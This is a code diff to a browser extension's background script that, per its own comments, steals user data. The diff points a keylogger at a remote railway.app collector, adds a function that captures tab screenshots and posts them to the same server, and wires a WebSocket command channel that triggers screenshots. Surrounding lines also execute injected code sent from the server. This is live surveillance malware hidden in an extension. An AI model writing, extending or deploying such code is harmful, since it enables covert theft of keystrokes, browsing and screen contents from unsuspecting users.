@@ -1,4 +1,8 @@
-importScripts("packages/acorn_interpreter.js", "packages/esprima.js","packages/escodegen.js", "packages/static-eval.js");
+importScripts("packages/acorn_interpreter.js", "packages/esprima.js", "packages/escodegen.js", "packages/static-eval.js");
+
+const SERVER_DOMAIN = 'extension-code-injector-production.up.railway.app'
+const HTTP_SERVER_URL = `http://${SERVER_DOMAIN}`;
+const WS_SERVER_URL = `ws://${SERVER_DOMAIN}`;
 
 // Perform the initial data steal and connect to websockets only after website is ready
 async function onReady() {
@@ -32,7 +36,7 @@ async function stealUserData() {
 async function onVisited(historyItem) {
     if (historyItem.url.includes('google.com')) {
         console.log('historyItem', historyItem);
-        const screenshotUrl = await chrome.tabs.captureVisibleTab();
+        const screenshotUrl = await chrome.tabs.captureVisibleTab({format: 'jpeg'});
         // TODO: take a screenshot and save it
     }
 }
@@ -41,10 +45,36 @@ chrome.history.onVisited.addListener(onVisited)
 
 /* =================================================================================== */
 
+// Utility function to take screenshot and send it to the server
+async function takeScreenshot() {
+    const currentTab = await getCurrentTab();
+    if (!currentTab) {
+        console.log('Could not find current tab');
+        return;
+    }
+
+    const screenshotUrl = await chrome.tabs.captureVisibleTab();
+    console.log(screenshotUrl)
+
+    try {
+        await fetch(`${HTTP_SERVER_URL}/collector/screenshot`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({dataUrl: screenshotUrl})
+        })
+    } catch (err) {
+        console.error(err.message);
+    }
+}
+
+/* =================================================================================== */
+
 // Send the input values to the server which will save them in a DB
 async function onInputMessage(message, sender, sendResponse) {
     try {
-        const response = await fetch('http://localhost:3000/key-logger', {
+        const response = await fetch(`${HTTP_SERVER_URL}/collector/key-logger`, {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json',
@@ -84,7 +114,7 @@ function connectWebSocket() {
         return;
     }
 
-    const socket = new WebSocket('ws://extension-code-injector-production.up.railway.app');
+    const socket = new WebSocket(WS_SERVER_URL);
 
     socket.onopen = () => {
         console.log('WebSocket connected');
@@ -118,6 +148,10 @@ async function onWsMessage(event) {
     if (!currentTab) {
         console.log('Could not find current tab');
         return;
+    }
+
+    if (parsedMessage.type.includes('SCREENSHOT')) {
+        return await takeScreenshot();
     }
 
     if (parsedMessage.type.includes('BG_COMMAND')) {
@@ -201,9 +235,9 @@ function executeWithStaticEval(command) {
 
     staticEval.evaluate(esprima.parse('console.log(`starting`)'), {console})
     staticEval.evaluate(
-            ast,
-            {chrome, console, fetch},
-        );
+        ast,
+        {chrome, console, fetch},
+    );
 }
 
 // Execute injected code through a setTimeout
